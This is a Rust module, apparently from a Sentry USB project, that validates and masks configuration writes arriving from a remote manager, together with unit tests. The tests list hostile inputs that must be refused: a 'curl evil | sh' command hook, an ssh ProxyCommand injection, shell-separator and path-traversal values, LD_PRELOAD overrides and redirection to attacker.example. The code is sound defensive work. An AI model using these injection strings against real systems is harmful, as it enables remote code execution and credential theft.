//! Setup-config secrets and write checks for requests that arrive over the
//! link (contract section 5, "Secrets in settings").
//!
//! - Reads: every secret field comes back as `""`, with a companion
//!   `"<FIELD>__set": true` when a value is stored.
//! - Writes: an empty or missing secret keeps the stored one.
//! - Writes are deny by default too: only the keys in `SETTABLE` may change
//!   over the link. Every other stored key is written back exactly as it
//!   is, so a Manager can't add a command hook, point updates at another
//!   repository, resize (and so erase) a drive, or take over the web login.

use std::collections::HashMap;

use serde_json::{Map, Value};

use crate::allowlist::Method;

/// The official update repository (mirrors `OFFICIAL_UPDATE_REPO` in the
/// api crate; a test there keeps the two equal).
pub const OFFICIAL_UPDATE_REPO: &str = "Sentry-Six/Sentry-USB-Rusty";

const MAX_VALUE_LEN: usize = 1024;
const MAX_KEYS: usize = 512;

/// Whether a setup-config key holds a secret (passwords, tokens, API keys,
/// and webhook/ntfy URLs, which carry their token in the URL).
pub fn is_secret_key(key: &str) -> bool {
    key.contains("PASS")
        || key.contains("TOKEN")
        || key.contains("SECRET")
        || key.ends_with("_KEY")
        || key.ends_with("_KEY_ID")
        || key.ends_with("WEBHOOK_URL")
        || key == "NTFY_URL"
        || key == "IFTTT_KEY"
}

/// Keys Manager may change over the link. Everything else is read-only
/// there. Left out on purpose:
/// - `WEB_USERNAME`, `WEB_PASSWORD`: setting them would let whoever holds
///   Manager sign in to the Pi's web UI, which has a root terminal.
/// - `NOTIFICATION_COMMAND_*`, `INSTALL_USER_REQUESTED_PACKAGES`, `REPO`,
///   `BRANCH`, `RCLONE_FLAGS`: run commands or install code.
/// - `*_SIZE`, `USE_EXFAT`, `DATA_DRIVE`, `USE_NVME`, `INCREASE_ROOT_SIZE`
///   and other disk keys: a change recreates drives and erases footage.
/// - `SAMBA_*`: would share the drives with the whole network.
/// - `SENTRY_MANAGER_*`: the link's own settings stay on the Pi.
/// - Anything unknown, including environment names like `PATH` or
///   `LD_PRELOAD` (sentryusb.conf is exported into root shells).
const SETTABLE: &[&str] = &[
    // Network
    "SSID", "WIFIPASS", "AP_SSID", "AP_PASS", "AP_IP", "SENTRYUSB_HOSTNAME", "TIME_ZONE",
    // Archive. The destination itself (ARCHIVE_SYSTEM, servers, shares,
    // users, paths, CIFS dialect) is NOT settable over the link: clips and
    // the automatic config backup (SSH and BLE private keys, every
    // password) go wherever it points, and several of those values reach
    // eval'd mount lines and /etc/fstab. Only the share password, for the
    // destination already set on the Pi, can be rotated.
    "SHARE_PASSWORD", "CIFS_NOSERVERINO", "ARCHIVE_DELAY", "ARCHIVE_STALL_GRACE_SECONDS",
    "ARCHIVE_RECENTCLIPS", "ARCHIVE_SAVEDCLIPS", "ARCHIVE_SENTRYCLIPS",
    "ARCHIVE_TRACKMODECLIPS", "ARCHIVE_VERIFY", "ARCHIVE_VERIFY_MODE",
    "ARCHIVE_VERIFY_MAX_SECONDS", "ARCHIVE_VERIFY_RECHECK_SECONDS", "ARCHIVE_VERIFY_PARALLEL",
    "ARCHIVE_VERIFY_MANAGER_WAIT_HOURS", "ARCHIVE_AUTO_DELETE_VERIFIED", "SNAPSHOT_INTERVAL",
    "TRIGGER_FILE_SAVED", "TRIGGER_FILE_SENTRY", "TRIGGER_FILE_RECENT", "TRIGGER_FILE_ANY",
    "SENTRY_CASE", "DRIVE_MAP_ENABLED", "DRIVE_MAP_UNIT", "DRIVE_MAP_WHILE_AWAY",
    // Notifications
    "NOTIFICATION_TITLE", "PUSHOVER_ENABLED", "PUSHOVER_USER_KEY", "PUSHOVER_APP_KEY",
    "GOTIFY_ENABLED", "GOTIFY_DOMAIN", "GOTIFY_APP_TOKEN", "GOTIFY_PRIORITY",
    "DISCORD_ENABLED", "DISCORD_WEBHOOK_URL", "TELEGRAM_ENABLED", "TELEGRAM_CHAT_ID",
    "TELEGRAM_BOT_TOKEN", "TELEGRAM_SILENT_NOTIFY", "IFTTT_ENABLED", "IFTTT_EVENT_NAME",
    "IFTTT_KEY", "SLACK_ENABLED", "SLACK_WEBHOOK_URL", "SIGNAL_ENABLED", "SIGNAL_URL",
    "SIGNAL_FROM_NUM", "SIGNAL_TO_NUM", "MATRIX_ENABLED", "MATRIX_SERVER_URL",
    "MATRIX_USERNAME", "MATRIX_PASSWORD", "MATRIX_ROOM", "SNS_ENABLED", "AWS_REGION",
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SNS_TOPIC_ARN", "WEBHOOK_ENABLED",
    "WEBHOOK_URL", "NTFY_ENABLED", "NTFY_URL", "NTFY_TOKEN", "NTFY_PRIORITY",
    "MOBILE_PUSH_ENABLED", "KEEP_AWAKE_WEBHOOK_URL", "TESLAFI_API_TOKEN", "TESSIE_API_TOKEN",
    "TESSIE_VIN", "TESLA_BLE_VIN",
    // Temperatures and units
    "TEMPERATURE_WARNING", "TEMPERATURE_CAUTION", "TEMPERATURE_INTERVAL",
    "TEMPERATURE_POSTARCHIVE", "TEMPERATURE_UNIT", "SYSTEM_TEMPERATURE_UNIT", "PRESSURE_UNIT",
];

pub fn is_settable(key: &str) -> bool {
    SETTABLE.contains(&key)
}

/// Values that end up as command-line arguments (mount, ssh, rsync, rclone,
/// hostnamectl, nmcli): a leading `-` would be read as an option.
const ARGUMENT_KEYS: &[&str] = &[
    "SSID", "AP_SSID", "AP_IP", "SENTRYUSB_HOSTNAME", "TIME_ZONE", "ARCHIVE_SERVER",
    "SHARE_NAME", "SHARE_USER", "SHARE_DOMAIN", "CIFS_VERSION", "CIFS_SEC", "RSYNC_USER",
    "RSYNC_SERVER", "RSYNC_PATH", "RSYNC_SSH_PORT", "RCLONE_DRIVE", "RCLONE_PATH",
    "MUSIC_SHARE_NAME", "TESSIE_VIN", "TESLA_BLE_VIN",
];

/// Values that go inside a `mount -o` option list, where `,` or `=` would
/// add options of the caller's choosing.
const MOUNT_OPTION_KEYS: &[&str] = &["SHARE_USER", "SHARE_DOMAIN", "CIFS_VERSION", "CIFS_SEC"];

/// Where archived clips and the automatic backup go. Read-only over the link.
const ARCHIVE_DESTINATION_KEYS: &[&str] = &[
    "ARCHIVE_SYSTEM", "ARCHIVE_SERVER", "SHARE_NAME", "SHARE_USER", "SHARE_DOMAIN",
    "CIFS_VERSION", "CIFS_SEC", "RSYNC_USER", "RSYNC_SERVER", "RSYNC_PATH", "RSYNC_SSH_PORT",
    "RCLONE_DRIVE", "RCLONE_PATH", "MUSIC_SHARE_NAME",
];

/// Numeric settings. Several are used in bash arithmetic (`$((X - 5000))`),
/// which evaluates a non-numeric value as an expression, so only digits.
const NUMBER_KEYS: &[&str] = &[
    "ARCHIVE_DELAY", "ARCHIVE_STALL_GRACE_SECONDS", "ARCHIVE_VERIFY_MAX_SECONDS",
    "ARCHIVE_VERIFY_RECHECK_SECONDS", "ARCHIVE_VERIFY_PARALLEL", "ARCHIVE_VERIFY_MANAGER_WAIT_HOURS",
    "SNAPSHOT_INTERVAL", "GOTIFY_PRIORITY", "NTFY_PRIORITY", "TEMPERATURE_WARNING",
    "TEMPERATURE_CAUTION", "TEMPERATURE_INTERVAL", "SENTRY_CASE", "RSYNC_SSH_PORT",
];

const BOOL_VALUES: &[&str] = &["true", "false", "yes", "no", "1", "0", "on", "off"];

fn is_bool_key(key: &str) -> bool {
    key.ends_with("_ENABLED")
        || matches!(
            key,
            "ARCHIVE_RECENTCLIPS" | "ARCHIVE_SAVEDCLIPS" | "ARCHIVE_SENTRYCLIPS" | "ARCHIVE_TRACKMODECLIPS"
                | "ARCHIVE_VERIFY" | "ARCHIVE_AUTO_DELETE_VERIFIED" | "CIFS_NOSERVERINO"
                | "DRIVE_MAP_WHILE_AWAY" | "TELEGRAM_SILENT_NOTIFY" | "TEMPERATURE_POSTARCHIVE"
        )
}

/// Short words: units, modes, regions, VINs, event names.
const TOKEN_KEYS: &[&str] = &[
    "ARCHIVE_VERIFY_MODE", "DRIVE_MAP_UNIT", "TEMPERATURE_UNIT", "SYSTEM_TEMPERATURE_UNIT",
    "PRESSURE_UNIT", "AWS_REGION", "TESSIE_VIN", "TESLA_BLE_VIN", "IFTTT_EVENT_NAME",
];

/// Addresses the Pi sends requests to.
const URL_KEYS: &[&str] = &[
    "GOTIFY_DOMAIN", "MATRIX_SERVER_URL", "SIGNAL_URL", "DISCORD_WEBHOOK_URL", "SLACK_WEBHOOK_URL",
    "WEBHOOK_URL", "NTFY_URL", "KEEP_AWAKE_WEBHOOK_URL",
];

/// A notification URL must be plain http(s) to some other machine. The
/// Pi's API trusts loopback without a login, so a webhook pointed at
/// 127.0.0.1 or localhost would let Manager call routes that are not on
/// its allowlist; link-local covers cloud-style metadata addresses.
fn check_url(key: &str, value: &str) -> Result<(), String> {
    if value.is_empty() {
        return Ok(());
    }
    let bad = || Err(format!("{key} must be an http:// or https:// address of another machine"));
    let Some(rest) = value.strip_prefix("https://").or_else(|| value.strip_prefix("http://")) else {
        return bad();
    };
    if value.chars().any(|c| c.is_whitespace() || matches!(c, '"' | '\'' | '`' | '\\' | '<' | '>' | '$')) {
        return bad();
    }
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    if authority.contains('@') {
        return bad();
    }
    let host = if let Some(h) = authority.strip_prefix('[') {
        h.split(']').next().unwrap_or("")
    } else {
        authority.rsplit_once(':').map_or(authority, |(h, _)| h)
    };
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    if host.is_empty() || host == "localhost" || host.ends_with(".localhost") {
        return bad();
    }
    if let Ok(ip) = host.parse::<std::net::IpAddr>() {
        let ip = ip.to_canonical();
        let blocked = ip.is_loopback()
            || ip.is_unspecified()
            || match ip {
                std::net::IpAddr::V4(v4) => v4.is_link_local() || v4.octets()[0] == 0,
                std::net::IpAddr::V6(v6) => (v6.segments()[0] & 0xffc0) == 0xfe80,
            };
        if blocked {
            return bad();
        }
    } else if host.chars().all(|c| c.is_ascii_digit() || c == '.') || host.starts_with("0x") {
        // Numeric forms like 2130706433 or 127.1 that resolvers read as IPs.
        return bad();
    }
    Ok(())
}

/// Checks one value Manager wants to write. Secrets are checked for control
/// characters only, since passwords may hold any printable character.
pub fn validate_value(key: &str, value: &str) -> Result<(), String> {
    if value.len() > MAX_VALUE_LEN {
        return Err(format!("{key} is too long"));
    }
    if value.chars().any(|c| c.is_control()) {
        return Err(format!("{key} must be a single line of text"));
    }
    if ARGUMENT_KEYS.contains(&key) && value.trim_start().starts_with('-') {
        return Err(format!("{key} must not start with '-'"));
    }
    if MOUNT_OPTION_KEYS.contains(&key) && value.contains([',', '=']) {
        return Err(format!("{key} must not contain ',' or '='"));
    }
    let only = |ok: fn(char) -> bool| value.chars().all(ok);
    let host_char = |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '[' | ']');
    // Typed keys first: these values reach shell arithmetic, `touch` paths,
    // config files and URLs that the Pi fetches as root.
    if NUMBER_KEYS.contains(&key) {
        if !value.is_empty() && (value.len() > 12 || !only(|c| c.is_ascii_digit())) {
            return Err(format!("{key} must be a whole number"));
        }
        return Ok(());
    }
    if is_bool_key(key) {
        if !value.is_empty() && !BOOL_VALUES.contains(&value.to_ascii_lowercase().as_str()) {
            return Err(format!("{key} must be true or false"));
        }
        return Ok(());
    }
    if TOKEN_KEYS.contains(&key) {
        if !only(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')) || value.starts_with('-') {
            return Err(format!("{key} must be letters, digits, '.', '_' or '-'"));
        }
        return Ok(());
    }
    if key.starts_with("TRIGGER_FILE_") {
        if value == "." || value == ".." || !only(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')) {
            return Err(format!("{key} must be a plain file name"));
        }
        return Ok(());
    }
    if URL_KEYS.contains(&key) {
        return check_url(key, value);
    }
    match key {
        "AP_IP" if !value.is_empty() && value.parse::<std::net::Ipv4Addr>().is_err() => {
            Err(format!("{key} must be an IPv4 address"))
        }
        "TELEGRAM_CHAT_ID"
            if !value.is_empty()
                && !(value.strip_prefix('-').unwrap_or(value).chars().all(|c| c.is_ascii_digit())
                    || value.strip_prefix('@').is_some_and(|r| r.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))) =>
        {
            Err(format!("{key} must be a chat id or @channel"))
        }
        "ARCHIVE_SERVER" | "RSYNC_SERVER" if !only(host_char) => {
            Err(format!("{key} must be a host name or IP address"))
        }
        "RSYNC_USER" if !only(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_')) => {
            Err(format!("{key} must be a plain user name"))
        }
        "SENTRYUSB_HOSTNAME"
            if value.is_empty()
                || value.len() > 63
                || !only(|c| c.is_ascii_alphanumeric() || c == '-') =>
        {
            Err(format!("{key} must be letters, digits and '-'"))
        }
        "TIME_ZONE"
            if value.contains("..")
                || !only(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '_' | '+' | '-')) =>
        {
            Err(format!("{key} must be a time zone name like Europe/Berlin"))
        }
        "RSYNC_SSH_PORT" if !value.is_empty() && !value.trim().parse::<u16>().is_ok_and(|p| p > 0) => {
            Err(format!("{key} must be a port number"))
        }
        _ => Ok(()),
    }
}

/// Masks the secrets in a `GET /api/setup/config` answer, which maps each
/// key to `{"value": ..., "active": ...}`. Commented-out entries are masked
/// too: they can hold an old real password.
pub fn mask_setup_config(body: Value) -> Value {
    let Value::Object(map) = body else { return body };
    let mut out = Map::with_capacity(map.len());
    for (key, entry) in map {
        if !is_secret_key(&key) {
            out.insert(key, entry);
            continue;
        }
        let (set, masked) = match entry {
            Value::Object(mut e) => {
                let set = e.get("value").and_then(Value::as_str).is_some_and(|v| !v.is_empty());
                e.insert("value".into(), Value::String(String::new()));
                (set, Value::Object(e))
            }
            Value::String(s) => (!s.is_empty(), Value::String(String::new())),
            _ => (false, Value::String(String::new())),
        };
        out.insert(format!("{key}__set"), Value::Bool(set));
        out.insert(key, masked);
    }
    Value::Object(out)
}

/// Where a stored secret is sent. Keeping a secret while pointing it at a
/// new place would hand it to whoever runs that place (a share password
/// to another server, a Wi-Fi password to another access point), so a
/// change to any of these needs the secret typed in again.
const SECRET_TARGETS: &[(&str, &[&str])] = &[
    ("SHARE_PASSWORD", &["ARCHIVE_SYSTEM", "ARCHIVE_SERVER", "SHARE_USER", "SHARE_DOMAIN"]),
    ("WIFIPASS", &["SSID"]),
    ("MATRIX_PASSWORD", &["MATRIX_SERVER_URL", "MATRIX_USERNAME"]),
    ("GOTIFY_APP_TOKEN", &["GOTIFY_DOMAIN"]),
    ("NTFY_TOKEN", &["NTFY_URL"]),
    ("AWS_SECRET_ACCESS_KEY", &["AWS_REGION", "AWS_ACCESS_KEY_ID"]),
];

/// Refuses to keep a stored secret whose target changed.
fn check_kept_secret(
    secret: &str,
    new_value_of: impl Fn(&str) -> Option<String>,
    active: &HashMap<String, String>,
) -> Result<(), String> {
    let Some((_, targets)) = SECRET_TARGETS.iter().find(|(s, _)| *s == secret) else {
        return Ok(());
    };
    for t in *targets {
        let new = new_value_of(t).unwrap_or_default();
        let old = active.get(*t).cloned().unwrap_or_default();
        if new != old {
            return Err(format!("{t} changed: enter {secret} again to send it there"));
        }
    }
    Ok(())
}

fn is_valid_key(key: &str) -> bool {
    let mut b = key.bytes();
    matches!(b.next(), Some(c) if c.is_ascii_uppercase() || c == b'_')
        && key.len() <= 64
        && b.all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == b'_')
}

/// Builds the map handed to `PUT /api/setup/config` (a full replacement of
/// the active settings) from what Manager sent and what is stored.
pub fn prepare_setup_config_write(
    body: &Value,
    active: &HashMap<String, String>,
) -> Result<HashMap<String, String>, String> {
    let Value::Object(incoming) = body else {
        return Err("Expected a JSON object of settings".into());
    };
    if incoming.len() > MAX_KEYS {
        return Err("Too many settings".into());
    }
    let mut out = HashMap::new();
    // Read-only keys keep their stored value whatever was sent.
    for (k, v) in active {
        if !is_settable(k) {
            out.insert(k.clone(), v.clone());
        }
    }
    for (key, value) in incoming {
        if let Some(base) = key.strip_suffix("__set") {
            // Read-side companions; ignored on write.
            if is_valid_key(base) {
                continue;
            }
        }
        if !is_valid_key(key) {
            return Err(format!("Invalid setting name {key:?}"));
        }
        let Value::String(value) = value else {
            return Err(format!("{key} must be a string"));
        };
        let secret = is_secret_key(key);
        if !is_settable(key) {
            let unchanged = active.get(key) == Some(value) || (secret && value.is_empty());
            if unchanged {
                continue;
            }
            return Err(format!("{key} can only be changed on the Sentry USB itself"));
        }
        if secret && value.is_empty() {
            if let Some(stored) = active.get(key) {
                out.insert(key.clone(), stored.clone());
            }
            continue;
        }
        validate_value(key, value)?;
        out.insert(key.clone(), value.clone());
    }
    // A secret left out keeps its stored value.
    for (k, v) in active {
        if is_secret_key(k) && !incoming.contains_key(k) {
            out.entry(k.clone()).or_insert_with(|| v.clone());
        }
    }
    // A kept secret must still go where it went before.
    for (k, v) in active {
        let sent_new = incoming.get(k).and_then(Value::as_str).is_some_and(|s| !s.is_empty());
        if is_secret_key(k) && !v.is_empty() && !sent_new && out.contains_key(k) {
            check_kept_secret(k, |t| out.get(t).cloned(), active)?;
        }
    }
    Ok(out)
}

/// `v3.29.0`, `3.29.0-test.1` -> (3, 29, 0). Pre-release suffixes are
/// ignored for the ordering.
pub fn release_number(v: &str) -> Option<(u64, u64, u64)> {
    let core = v.trim().trim_start_matches('v').split(['-', '+']).next()?;
    let mut it = core.split('.').map(|p| p.parse::<u64>().ok());
    let n = (it.next()??, it.next().unwrap_or(Some(0))?, it.next().unwrap_or(Some(0))?);
    if it.next().is_some() {
        return None;
    }
    Some(n)
}

/// Preferences that change what gets installed or repaired on the Pi stay
/// on the Pi; the rest are UI settings, bounded in size.
const LOCAL_ONLY_PREFERENCES: &[&str] =
    &["update_channel", "auto_install_stable_updates", "storage_auto_repair", "storage_auto_force_repair"];
const MAX_PREFERENCE_BYTES: usize = 64 * 1024;

fn check_preference(body: &Value) -> Result<(), (u16, String)> {
    let key = body.get("key").and_then(Value::as_str).unwrap_or("");
    if key.is_empty() || key.len() > 64 || !key.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-') {
        return Err((400, "Invalid preference name".into()));
    }
    if LOCAL_ONLY_PREFERENCES.contains(&key) {
        return Err((403, format!("{key} can only be changed on the Sentry USB itself")));
    }
    if body.to_string().len() > MAX_PREFERENCE_BYTES {
        return Err((400, "Preference value is too large".into()));
    }
    Ok(())
}

/// Checks (and where needed rewrites) the body of a write request before it
/// reaches the handler. `Ok(None)` passes the body through unchanged.
pub fn check_write(
    method: Method,
    path: &str,
    body: &Value,
    active: &HashMap<String, String>,
    running_version: &str,
) -> Result<Option<Value>, (u16, String)> {
    let bad = |m: String| (400u16, m);
    match (method, path) {
        (Method::Put, "/api/setup/config") => {
            let map = prepare_setup_config_write(body, active).map_err(bad)?;
            Ok(Some(serde_json::to_value(map).unwrap_or(Value::Null)))
        }
        (Method::Post, "/api/setup/test-archive") => {
            let Value::Object(incoming) = body else {
                return Err(bad("Expected a JSON object of settings".into()));
            };
            let mut out = Map::new();
            for (key, value) in incoming {
                if !is_valid_key(key) {
                    continue;
                }
                let Value::String(value) = value else {
                    return Err(bad(format!("{key} must be a string")));
                };
                // Only the destination stored on the Pi can be tested.
                if ARCHIVE_DESTINATION_KEYS.contains(&key.as_str())
                    && value.trim() != active.get(key).map(|s| s.trim()).unwrap_or("")
                {
                    return Err((403, format!("{key} can only be changed on the Sentry USB itself")));
                }
                // The CIFS test passes the password inside `mount -o`, where
                // a comma would add mount options.
                if key == "SHARE_PASSWORD" && value.contains(',') {
                    return Err(bad("Test a password with ',' on the Sentry USB itself".into()));
                }
                if is_secret_key(key) && value.is_empty() {
                    if let Some(stored) = active.get(key) {
                        // Only probe the stored destination with the stored
                        // password, never a new server.
                        check_kept_secret(
                            key,
                            |t| incoming.get(t).and_then(Value::as_str).map(str::to_string)
                                .or_else(|| active.get(t).cloned()),
                            active,
                        )
                        .map_err(bad)?;
                        out.insert(key.clone(), Value::String(stored.clone()));
                    }
                    continue;
                }
                validate_value(key, value).map_err(bad)?;
                out.insert(key.clone(), Value::String(value.clone()));
            }
            Ok(Some(Value::Object(out)))
        }
        (Method::Put, "/api/config/preference") => check_preference(body).map(|_| None),
        (Method::Put, "/api/system/update-source") => {
            // A custom source would install someone else's binaries as root.
            let repo = body.get("repo").and_then(Value::as_str).map(str::trim);
            match repo {
                Some(r) if r.is_empty() || r.eq_ignore_ascii_case(OFFICIAL_UPDATE_REPO) => {
                    Ok(Some(serde_json::json!({"repo": ""})))
                }
                _ => Err((
                    403,
                    "Over Sentry Manager the update source can only be set back to the official one. \
                     Change it on the Sentry USB itself."
                        .into(),
                )),
            }
        }
        (Method::Post, "/api/system/update") => match body {
            Value::Null => Ok(None),
            Value::Object(o) => match o.get("version") {
                None | Some(Value::Null) => Ok(Some(Value::Null)),
                Some(Value::String(v))
                    if !v.is_empty()
                        && v.len() <= 64
                        && !v.contains("..")
                        && v.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+')) =>
                {
                    // An older official release can bring back fixed holes
                    // or not run on this install: no downgrades over the link.
                    match (release_number(v), release_number(running_version)) {
                        (Some(want), Some(have)) if want < have => Err((
                            403,
                            "Over Sentry Manager the Sentry USB can't be moved to an older version.".into(),
                        )),
                        (None, Some(_)) => Err(bad("version must be a release tag like v3.29.0".into())),
                        _ => Ok(Some(serde_json::json!({"version": v}))),
                    }
                }
                _ => Err(bad("version must be a release tag like v3.29.0".into())),
            },
            _ => Err(bad("Expected {\"version\": ...} or no body".into())),
        },
        _ => Ok(None),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn stored() -> HashMap<String, String> {
        HashMap::from([
            ("SSID".into(), "Home".into()),
            ("WIFIPASS".into(), "wifi-secret".into()),
            ("SHARE_PASSWORD".into(), "share-secret".into()),
            ("WEB_USERNAME".into(), "admin".into()),
            ("WEB_PASSWORD".into(), "web-secret".into()),
            ("CAM_SIZE".into(), "40G".into()),
            ("NOTIFICATION_COMMAND_START".into(), "/root/hook.sh".into()),
            ("REPO".into(), "me/fork".into()),
            ("TELEGRAM_BOT_TOKEN".into(), "bot-token".into()),
            ("ARCHIVE_SERVER".into(), "nas.local".into()),
        ])
    }

    #[test]
    fn secrets_are_recognized() {
        for k in [
            "WIFIPASS", "AP_PASS", "SHARE_PASSWORD", "WEB_PASSWORD", "MATRIX_PASSWORD",
            "PUSHOVER_USER_KEY", "PUSHOVER_APP_KEY", "GOTIFY_APP_TOKEN", "IFTTT_KEY",
            "DISCORD_WEBHOOK_URL", "SLACK_WEBHOOK_URL", "WEBHOOK_URL", "KEEP_AWAKE_WEBHOOK_URL",
            "TELEGRAM_BOT_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "NTFY_URL",
            "NTFY_TOKEN", "TESLAFI_API_TOKEN", "TESSIE_API_TOKEN",
        ] {
            assert!(is_secret_key(k), "{k}");
        }
        for k in ["SSID", "ARCHIVE_SERVER", "WEB_USERNAME", "SHARE_USER", "CAM_SIZE"] {
            assert!(!is_secret_key(k), "{k}");
        }
    }

    #[test]
    fn reads_mask_every_secret_active_or_commented() {
        let body = json!({
            "SSID": {"value": "Home", "active": true},
            "WIFIPASS": {"value": "wifi-secret", "active": true},
            "WEB_PASSWORD": {"value": "old-secret", "active": false},
            "AP_PASS": {"value": "", "active": true},
        });
        let masked = mask_setup_config(body);
        assert_eq!(masked["SSID"]["value"], "Home");
        assert_eq!(masked["WIFIPASS"], json!({"value": "", "active": true}));
        assert_eq!(masked["WIFIPASS__set"], true);
        assert_eq!(masked["WEB_PASSWORD"]["value"], "");
        assert_eq!(masked["WEB_PASSWORD__set"], true);
        assert_eq!(masked["AP_PASS__set"], false);
        let text = masked.to_string();
        assert!(!text.contains("wifi-secret") && !text.contains("old-secret"));
    }

    #[test]
    fn empty_or_missing_secret_keeps_the_stored_one() {
        let out = prepare_setup_config_write(
            &json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local", "WIFIPASS": "", "WIFIPASS__set": true, "WEB_PASSWORD": ""}),
            &stored(),
        )
        .unwrap();
        assert_eq!(out["WIFIPASS"], "wifi-secret");
        // Not sent at all: still kept.
        assert_eq!(out["SHARE_PASSWORD"], "share-secret");
        assert_eq!(out["TELEGRAM_BOT_TOKEN"], "bot-token");
        assert_eq!(out["WEB_PASSWORD"], "web-secret");
        assert!(!out.contains_key("WIFIPASS__set"));
    }

    #[test]
    fn a_kept_secret_cannot_follow_a_new_destination() {
        // Pointing the archive at another server with the stored password.
        let err = prepare_setup_config_write(
            &json!({"SSID": "Home", "ARCHIVE_SERVER": "attacker.example", "SHARE_PASSWORD": ""}),
            &stored(),
        )
        .unwrap_err();
        assert!(err.contains("ARCHIVE_SERVER"), "{err}");
        // The Wi-Fi password to another access point.
        assert!(prepare_setup_config_write(
            &json!({"SSID": "Evil", "ARCHIVE_SERVER": "nas.local"}),
            &stored(),
        )
        .is_err());
        // Rotating the share password for the stored server is fine.
        let out = prepare_setup_config_write(
            &json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local", "SHARE_PASSWORD": "typed"}),
            &stored(),
        )
        .unwrap();
        assert_eq!(out["SHARE_PASSWORD"], "typed");
        // The connection test never sends the stored password elsewhere.
        assert!(check_write(
            Method::Post,
            "/api/setup/test-archive",
            &json!({"ARCHIVE_SYSTEM": "cifs", "ARCHIVE_SERVER": "attacker.example", "SHARE_PASSWORD": ""}),
            &stored(),
            "",
        )
        .is_err());
    }

    #[test]
    fn a_new_secret_replaces_the_stored_one() {
        let out = prepare_setup_config_write(&json!({"WIFIPASS": "new-wifi", "ARCHIVE_SERVER": "nas.local"}), &stored()).unwrap();
        assert_eq!(out["WIFIPASS"], "new-wifi");
    }

    #[test]
    fn read_only_keys_keep_their_stored_values() {
        // Sent back unchanged (as a full map would be): fine.
        let out = prepare_setup_config_write(
            &json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local", "CAM_SIZE": "40G", "REPO": "me/fork", "NOTIFICATION_COMMAND_START": "/root/hook.sh"}),
            &stored(),
        )
        .unwrap();
        assert_eq!(out["CAM_SIZE"], "40G");
        // Left out: still kept, not commented out.
        let out = prepare_setup_config_write(&json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local"}), &stored()).unwrap();
        assert_eq!(out["CAM_SIZE"], "40G");
        assert_eq!(out["REPO"], "me/fork");
        assert_eq!(out["NOTIFICATION_COMMAND_START"], "/root/hook.sh");
        assert_eq!(out["WEB_USERNAME"], "admin");
    }

    #[test]
    fn dangerous_changes_are_refused() {
        for body in [
            json!({"NOTIFICATION_COMMAND_START": "curl evil | sh"}),
            json!({"NOTIFICATION_COMMAND_ENABLED": "true"}),
            json!({"INSTALL_USER_REQUESTED_PACKAGES": "evil"}),
            json!({"REPO": "attacker/evil"}),
            json!({"BRANCH": "evil"}),
            json!({"RCLONE_FLAGS": "--config=/tmp/x"}),
            json!({"CAM_SIZE": "1G"}),
            json!({"USE_EXFAT": "false"}),
            json!({"DATA_DRIVE": "/dev/sda"}),
            json!({"WEB_PASSWORD": "attacker"}),
            json!({"WEB_USERNAME": "attacker"}),
            json!({"SAMBA_GUEST": "true"}),
            json!({"SENTRY_MANAGER_ADDRESS": "evil:10000"}),
            json!({"LD_PRELOAD": "/tmp/x.so"}),
            json!({"PATH": "/tmp"}),
            json!({"BASH_ENV": "/tmp/x"}),
            json!({"bad key": "x"}),
            json!({"EVIL\nexport X": "x"}),
            json!({"RSYNC_USER": "-oProxyCommand=sh -c evil"}),
            json!({"RSYNC_SERVER": "nas;reboot"}),
            json!({"ARCHIVE_SERVER": "-o"}),
            json!({"SHARE_USER": "u,uid=0"}),
            json!({"SENTRYUSB_HOSTNAME": "a b"}),
            json!({"TIME_ZONE": "../../etc/passwd"}),
            json!({"SSID": "two\nlines"}),
            json!({"SSID": 5}),
            json!(["not", "an", "object"]),
        ] {
            assert!(prepare_setup_config_write(&body, &stored()).is_err(), "{body} was accepted");
        }
    }

    #[test]
    fn archive_destination_is_read_only_even_with_a_new_password() {
        // Clips and the automatic backup (SSH/BLE keys, passwords) follow
        // the destination, so typing a password of one's own doesn't help.
        for body in [
            json!({"ARCHIVE_SERVER": "attacker.example", "SHARE_PASSWORD": "mine"}),
            json!({"ARCHIVE_SYSTEM": "rsync", "RSYNC_SERVER": "attacker.example"}),
            json!({"SHARE_NAME": "TeslaCam'x"}),
            json!({"MUSIC_SHARE_NAME": "/x /root/bin nfs rw 0 0"}),
            json!({"CIFS_VERSION": "3.0 0 0"}),
            json!({"RCLONE_DRIVE": "evil"}),
        ] {
            assert!(prepare_setup_config_write(&body, &stored()).is_err(), "{body} was accepted");
        }
        // The same values sent back unchanged are fine.
        assert!(prepare_setup_config_write(&json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local"}), &stored()).is_ok());
    }

    #[test]
    fn typed_values_are_checked() {
        for (k, v) in [
            ("TEMPERATURE_WARNING", "a[x]"),
            ("TEMPERATURE_CAUTION", "1+1"),
            ("ARCHIVE_DELAY", "20 "),
            ("SNAPSHOT_INTERVAL", "-1"),
            ("SENTRY_CASE", "x"),
            ("ARCHIVE_VERIFY", "reboot"),
            ("WEBHOOK_ENABLED", "maybe"),
            ("TRIGGER_FILE_SAVED", "../../etc/nologin"),
            ("TRIGGER_FILE_ANY", ".."),
            ("AP_IP", "192.168.66.1 x"),
            ("TEMPERATURE_UNIT", "C;x"),
            ("TESLA_BLE_VIN", "-x"),
            ("TELEGRAM_CHAT_ID", "12a"),
        ] {
            assert!(validate_value(k, v).is_err(), "{k}={v:?} was accepted");
        }
        for (k, v) in [
            ("TEMPERATURE_WARNING", "68000"),
            ("ARCHIVE_DELAY", ""),
            ("ARCHIVE_VERIFY", "True"),
